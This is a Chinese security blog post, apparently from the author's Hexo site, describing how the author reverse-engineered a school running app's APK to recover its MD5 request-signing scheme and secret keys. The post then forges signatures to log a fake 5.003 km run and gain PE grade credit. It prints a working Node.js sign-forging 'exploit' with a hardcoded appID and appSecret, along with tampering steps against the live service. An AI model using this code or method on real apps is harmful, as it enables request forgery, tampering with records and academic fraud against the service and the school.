@@ -1,0 +1,118 @@
+<!DOCTYPE html><html class="appearance-auto" lang="cn"><head><meta charset="UTF-8"><title>重生之我是赏金猎人(二)-逆向app破解数据包sign值实现任意数据重放添加</title><meta name="description" content="J0o1ey Blog | Hack for Sec and Good"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
+<!-- Baidu Analytics --><script>var _hmt = _hmt || [];
+(function() {
+var hm = document.createElement("script");
+hm.src = "//hm.baidu.com/hm.js?" + '1da71ad199e154beef984da705235690';
+var s = document.getElementsByTagName("script")[0];
+s.parentNode.insertBefore(hm, s);
+})();</script><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.ico"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="0x00前言本文首发奇安信攻防社区，作者J0o1ey，大家可以多多支持奇安信攻防社区哦，技术氛围浓厚，作者待遇优厚~
+本期登场的目标虽不是SRC，但是整个漏洞的利用手法很有学习意义。目前在很多大厂的http数据包中都会添加sign值对数据包是否被篡改进行校验，而sign算法的破解往往是我们漏洞测试的关键所在~
+本人在一些漏洞挖掘实战中经常发现在破解sign值后，在测试各类越权，重放等漏洞时一马平川
+今天特此为大家带来这样一个精彩的实战案例。
+
+0x01 背景学校每学期的体育成绩中会有10％来源于某跑步APP的打卡数据，本人作为一个体测只能勉强及格的废物，自然得想办法拿到这10分，以防挂科
+无奈这个app后台设置的是每学期男生总共要求跑120公里才能完整地拿到10分，非常恶心。
+一学期跑120公里，你还不如鲨.."><meta name="generator" content="Hexo 6.3.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">J0o1ey's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">重生之我是赏金猎人(二)-逆向app破解数据包sign值实现任意数据重放添加</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">点击返回顶部</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">首页</a></h3><h3 class="is-inline-block"><a href="/about">关于</a></h3><h3 class="is-inline-block"><a href="/archives">归档</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">首页</a></h3><h3 class="is-inline-block"><a href="/about">关于</a></h3><h3 class="is-inline-block"><a href="/archives">归档</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00%E5%89%8D%E8%A8%80"><span class="toc-text">0x00前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E8%83%8C%E6%99%AF"><span class="toc-text">0x01 背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%88%9D%E6%AD%A5%E6%B5%8B%E8%AF%95"><span class="toc-text">0x02 初步测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E4%BD%95%E4%B8%BASign%E7%AD%BE%E5%90%8D%E6%A0%A1%E9%AA%8C%EF%BC%9F"><span class="toc-text">0x03 何为Sign签名校验？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-sign%E5%80%BC%E7%9A%84%E5%AE%89%E5%85%A8%E5%AF%B9%E6%8A%97%E6%96%B9%E6%B3%95"><span class="toc-text">0x04 sign值的安全对抗方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E4%BA%8C%E6%AC%A1%E6%B5%8B%E8%AF%95"><span class="toc-text">0x05 二次测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E9%80%86%E5%90%91apk%E6%96%87%E4%BB%B6%E5%8F%96%E5%BE%97%E5%85%B6sign%E5%80%BC%E7%AE%97%E6%B3%95"><span class="toc-text">0x06 逆向apk文件取得其sign值算法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E7%BB%A7%E7%BB%AD%E9%80%86%E5%90%91apk%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96%E6%9C%AA%E7%9F%A5%E9%94%AE%E5%80%BC%E5%AF%B9"><span class="toc-text">0x07 继续逆向apk文件获取未知键值对</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-Nodejs%E7%BC%96%E5%86%99%E8%AE%A1%E7%AE%97sign%E7%9A%84Exploit"><span class="toc-text">0x08 Nodejs编写计算sign的Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-%E6%B5%8B%E8%AF%95"><span class="toc-text">0x09 测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-%E5%90%8E%E8%A8%80"><span class="toc-text">0x10 后言</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><i class="tag post-item-tag">漏洞挖掘</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">重生之我是赏金猎人(二)-逆向app破解数据包sign值实现任意数据重放添加</h1><time class="has-text-grey" datetime="2021-10-30T13:13:08.000Z">2021-10-30</time><article class="mt-2 post-content"><h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>本文首发奇安信攻防社区，作者J0o1ey，大家可以多多支持奇安信攻防社区哦，技术氛围浓厚，作者待遇优厚~</p>
+<p>本期登场的目标虽不是SRC，但是整个漏洞的利用手法很有学习意义。<strong>目前在很多大厂的http数据包中都会添加sign值对数据包是否被篡改进行校验，而sign算法的破解往往是我们漏洞测试的关键所在~</strong></p>
+<p>本人在一些漏洞挖掘实战中<strong>经常发现在破解sign值后，在测试各类越权，重放等漏洞时一马平川</strong></p>
+<p>今天特此为大家带来这样一个精彩的实战案例。</p>
+<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134573.jpg"></p>
+<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>学校每学期的体育成绩中会有10％来源于某跑步APP的打卡数据，本人作为一个<strong>体测只能勉强及格</strong>的废物，自然得想办法拿到这10分，以防挂科</p>
+<p>无奈这个app后台设置的是每学期男生总共要求跑120公里才能完整地拿到10分，非常恶心。</p>
+<p>一学期跑120公里，你还不如鲨了我，于是便有了此文对于其app的crack</p>
+<h2 id="0x02-初步测试"><a href="#0x02-初步测试" class="headerlink" title="0x02 初步测试"></a>0x02 初步测试</h2><p>手机装好https证书，挂好Burpsuite的代理，随后我们直接去抓取该APP上传校园跑步数据时的请求<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134858.png" alt="跑步数据上传解密"></p>
+<p>请求如下</p>
+<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134145.png" alt="跑步数据请求"></p>
+<p>我们发现单次跑步距离对应的POST参数为FormatSportRange，自然二话不说对其进行修改，将0.000修改为5.000</p>
+<p>此时悲剧发生了，直接提示认证失败~</p>
+<p>定神细看，发现POST数据末尾有sign签名….</p>
+<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134373.png" alt="报文末尾sign签名"></p>
+<p>此时老开发或老安全肯定就知道发生甚么事了，为了让本文对新手友好一些，下面简单讲一下sign校验手法</p>
+<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134482.jpg"></p>
+<h2 id="0x03-何为Sign签名校验？"><a href="#0x03-何为Sign签名校验？" class="headerlink" title="0x03 何为Sign签名校验？"></a>0x03 何为Sign签名校验？</h2><p><strong>Sign签名校验法本质上是对客户端传输数据合法性的一种校验手段</strong></p>
+<p><strong>其常用手法为，在用户客户端传输的数据中额外加上时间戳以及特殊字符，随后一起得出整体数据的加密值(常用MD5,SHA1等加密算法)</strong></p>
+<p><strong>这就导致了用户在不知晓程序的原始数据生成sign值的方法情况下，若对传输到服务端的数据进行篡改，在后端都会鉴权失败，导致用户篡改后的数据无效。</strong></p>
+<h2 id="0x04-sign值的安全对抗方法"><a href="#0x04-sign值的安全对抗方法" class="headerlink" title="0x04 sign值的安全对抗方法"></a>0x04 sign值的安全对抗方法</h2><p>针对有sign签名值的数据包，本人常用的测试手法有两个：</p>
+<p><strong>1.检测sign值是否为弱凭据</strong></p>
+<p><strong>2.检测sign值是否可以置空</strong></p>
+<p><strong>第一种类型通常有两种情况</strong></p>
+<p><strong>①看sign值是否采用了一些弱加密&#x2F;编码方法(例如base64)，我们解码后可以直接看到sign的原始数据。</strong></p>
+<p><strong>②测试sign值是否为时间戳&#x2F;随机数加密后的密文值，在一些实战情况中，很多厂商安全开发意识不足，会将sign值的算法直接暴露在前端未加密的js中，或者直接将用户进行某操作的时间戳进行md5加密后作为sign凭据，导致sign凭据在一段时间内可以通过遍历时间戳进行猜解</strong></p>
+<p><strong>第二种类型就比较好理解，我们直接将sign参数以及值删掉，看后端程序是否可以不校验sign直接执行我们传输的数据</strong></p>
+<p>上述概念可能看起来比较抽象，下面我们继续来看本案例</p>
+<h2 id="0x05-二次测试"><a href="#0x05-二次测试" class="headerlink" title="0x05 二次测试"></a>0x05 二次测试</h2><p>我们先尝试第一种方法，上方添加跑步记录获取到的sign值为<strong>5ded7f11f080fb5a9d403c9d0963ebaa</strong></p>
+<p>拿眼一看，大概率sign值是使用md5加密的，我们随后对其进行解密</p>
+<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134572.png" alt="md5解密sign"></p>
+<p>GG了，看样厂商的安全意识不算太差~没有使用时间戳或者随机数加密后的值作为sign，导致sign可以被无脑遍历猜解</p>
+<p>随后我们尝试第二种方法，置空sign值</p>
+<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134750.png" alt="置空sign"></p>
+<p>发现依然鉴权认证失败，gg了。</p>
+<p>看样两种常规的对抗sign的方法已经废了，我们只能从app下手了，逆向尝试去寻找其sign的算法</p>
+<h2 id="0x06-逆向apk文件取得其sign值算法"><a href="#0x06-逆向apk文件取得其sign值算法" class="headerlink" title="0x06 逆向apk文件取得其sign值算法"></a>0x06 逆向apk文件取得其sign值算法</h2><p>拿到程序apk直接查壳，运气不错，apk没加壳，省了不少功夫</p>
+<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134862.png" alt="查壳"></p>
+<p>直接将apk文件拖到jadx中，对其进行逆向分析</p>
+<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134098.png" alt="jadx逆向"></p>
+<p>全局搜素sign，在仔细挨个查看后，成功定位到了其sign生成的关键算法</p>
+<p>代码过长，关键部分代码如下</p>
+<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134337.png" alt="sign算法①"></p>
+<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134437.png" alt="sign算法②"></p>
+<p>可以看到，其sign值的签名算法为</p>
+<p>创建一个链表, 将全部已有的参数加入进去, 然后再加上一些键值对(其中timestamp时间戳我们已知，appID，appSecret两个键值对我们均未知)</p>
+<p>之后再将全部的键值对根据键的字母顺序进行排序, 之后使用 <code>querystring</code> 方式对键值对进行编码.</p>
+<p>最后再对编码后的字符串求 <code>MD5</code> 值, 就是最终的签名了, 麻烦的一比</p>
+<h2 id="0x07-继续逆向apk文件获取未知键值对"><a href="#0x07-继续逆向apk文件获取未知键值对" class="headerlink" title="0x07 继续逆向apk文件获取未知键值对"></a>0x07 继续逆向apk文件获取未知键值对</h2><p>我们继续来找appID，appSecret两个我们未知的键值对</p>
+<p>发现其获取方法如下</p>
+<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134569.png" alt="获取未知键值对"></p>
+<p><strong>①appID键值对的获取方法:</strong></p>
+<p>如果请求的url是 <a target="_blank" rel="noopener" href="https://m.xxxxx.com/">https://m.xxxxx.com</a> 则为move，否则调用getAppId方法</p>
+<p>后面我搜索了一下getAppId方法，发现其本质上是获取某接口openId的参数值，随后赋值给AppID</p>
+<p>我去burpsuite走了一遍这个apk的业务，然后去http history搜索了一下openId,直接获取到了我们学校的openId参数值，也就是说我们获取到了AppID</p>
+<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134671.png" alt="获取AppID"></p>
+<p><strong>②appSceret键值对获取方法</strong></p>
+<p>在jadx中提示appSecre键t对应的值来源于g.b，我们在import的包中成功找到了g.b（即appSecret）</p>
+<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134802.png" alt="appSecret"></p>
+<h2 id="0x08-Nodejs编写计算sign的Exploit"><a href="#0x08-Nodejs编写计算sign的Exploit" class="headerlink" title="0x08 Nodejs编写计算sign的Exploit"></a>0x08 Nodejs编写计算sign的Exploit</h2><p>sign的算法已经有了，未知的键值对我们也拿到了，下面就是直接编写计算sign的exploit的时刻啦~</p>
+<p>我们选择用nodejs来还原整个sign的加密算法(注意，我们将formatSportRange跑步距离改为了5.003)</p>
+<pre><code class="javascript">var parseQueryString = function( url )&#123;
+    var reg_url =/^[^\?]+\?([\w\W]+)$/,
+        reg_para=/([^&amp;=]+)=([\w\W]*?)(&amp;|$)/g, //g is very important
+        arr_url = reg_url.exec( url ),
+        ret        = &#123;&#125;;
+    if( arr_url &amp;&amp; arr_url[1] )&#123;
+        var str_para = arr_url[1],result;
+        while((result = reg_para.exec(str_para)) != null)&#123;
+            ret[result[1]] = result[2];
+        &#125;
+    &#125;
+    return ret;
+&#125;
+var url =&quot;www.xxx.com/index.php?userId=34263&amp;runType=2&amp;startTime=1635573372448&amp;endTime=1635573425940&amp;gitudeLatitude=%5B%7B%22latitude%22%3A34.383468%2C%22locationType%22%3A4%2C%22longitude%22%3A108.976148%2C%22puase%22%3Afalse%2C%22speed%22%3A0.0%2C%22time%22%3A1635573372480%7D%2C%7B%22latitude%22%3A34.383484%2C%22locationType%22%3A4%2C%22longitude%22%3A108.976155%2C%22puase%22%3Atrue%2C%22speed%22%3A0.0%2C%22time%22%3A1635573373314%7D%2C%7B%22latitude%22%3A34.383489%2C%22locationType%22%3A2%2C%22longitude%22%3A108.976155%2C%22puase%22%3Atrue%2C%22speed%22%3A1.55%2C%22time%22%3A1635573378344%7D%2C%7B%22latitude%22%3A34.383408%2C%22locationType%22%3A2%2C%22longitude%22%3A108.976193%2C%22puase%22%3Atrue%2C%22speed%22%3A1.55%2C%22time%22%3A1635573398400%7D%2C%7B%22latitude%22%3A34.383479%2C%22locationType%22%3A2%2C%22longitude%22%3A108.976152%2C%22puase%22%3Atrue%2C%22speed%22%3A1.55%2C%22time%22%3A1635573418403%7D%5D&amp;identify=12cc1557-f226-4d19-a01f-58f492620818&amp;formatSportTime=00%3A00%3A01&amp;formatSportRange=5.003&amp;avgspeed=0.0&amp;speed=0%270%22&amp;okPointList=%5B%5D&amp;brand=Xiaomi&amp;model=Mi%2010&amp;system=Android&amp;version=10&amp;appVersion=1.5.73&amp;stepNumbers=%5B0%5D&amp;isFaceStatus=0&amp;points=%5B%5D&amp;uploadType=0&amp;timestamp=1635573451940&quot;;
+var obj = parseQueryString(url);
+//console.log(obj)   //querystring序列化
+
+const crypto = require(&#39;crypto&#39;)
+const APP_ID = &quot;ec74df4f7ea14f1fb585bbc9f936fc23&quot;
+const data = obj
+console.log(data)
+const timestamp = &#39;1635573451940&#39;
+
+function ff(data, timestamp, appId = APP_ID)&#123;
+  const d = &#123; ...data, appId, timestamp: &#39;1634356066432&#39;,appSecret: &#39;e8167ef026cbc5e456ab837d9d6d9254&#39; &#125;
+  const ans = crypto.createHash(&#39;md5&#39;).update(Object.keys(d).sort().map(k =&gt; k + &#39;=&#39; + d[k]).join(&#39;&amp;&#39;)).digest(&#39;hex&#39;)
+  console.log(&quot;sign is&quot;,ans)
+&#125;
+
+ff(data, timestamp, APP_ID)
+</code></pre>
+<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134886.png" alt="计算sign"></p>
+<p>大功告成，我们成功序列化queryString后计算出了sign值，我们现在可以篡改任意数据并根据算法生成伪造的sign值</p>
+<h2 id="0x09-测试"><a href="#0x09-测试" class="headerlink" title="0x09 测试"></a>0x09 测试</h2><p>我们将原来的formatSportRange跑步距离改为了从0.000修改为5.003，并使用程序生成的sign值</p>
+<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134045.png" alt="image-20211030160329056"></p>
+<p>如图，大功告成，跑步记录保存成功，我们成功使用伪造的sign签名增加了一条5.003 km的跑步记录</p>
+<p>返回app查看~</p>
+<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134137.png"></p>
+<p>nice！</p>
+<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134311.png"></p>
+<h2 id="0x10-后言"><a href="#0x10-后言" class="headerlink" title="0x10 后言"></a>0x10 后言</h2><p>遇到可能的漏洞点莫要轻言放弃，再坚持一下，曙光就在前方~</p>
+<img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134984.gif" style="zoom:80%;" />
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2021/11/19/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E4%B8%89-%E6%97%A0%E8%84%91%E6%8C%96%E6%8E%98%E6%9F%90SRC-getshell/" title="重生之我是赏金猎人(三)-无脑挖掘某SRC getshell"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">上一页: 重生之我是赏金猎人(三)-无脑挖掘某SRC getshell</span></a><a class="button is-default" href="/2021/08/19/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E4%B8%80-%E8%BD%BB%E6%9D%BEget%E6%9F%90src-soap%E6%B3%A8%E5%85%A5/" title="重生之我是赏金猎人(一)-轻松get某src soap注入"><span class="has-text-weight-semibold">下一页: 重生之我是赏金猎人(一)-轻松get某src soap注入</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="j0o1ey/j0o1ey.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com//"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/j0o1ey"><i class="iconfont icon-github"></i></a><!-- Ins--><a title="instagram" target="_blank" rel="noopener nofollow" href="//www.instagram.com//"><i class="iconfont icon-ins"></i></a><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--><a title="facebook" target="_blank" rel="noopener nofollow" href="//www.facebook.com//"><i class="iconfont icon-tian7_facebook"></i></a></section><p><span>Copyright ©</span><span> J0o1ey 2023</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
